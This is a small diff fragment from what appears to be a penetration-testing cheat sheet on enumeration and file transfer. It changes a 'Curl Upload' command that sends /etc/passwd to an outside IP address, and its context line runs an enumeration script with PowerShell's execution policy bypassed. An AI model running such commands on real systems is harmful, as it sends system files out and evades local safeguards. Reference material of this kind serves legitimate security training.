@@ -394,7 +394,7 @@ C:\temp> powershell.exe -ExecutionPolicy Bypass -File .\jaws-enum.ps1
 
 <h4>Curl Upload</h4>
 
-    curl --upload-file /etc/passwd http://10.11.0.64:53
+    curl --upload-file /etc/passwd http://10.10.10.10
 
 <h4>TFTP</h4> 
 
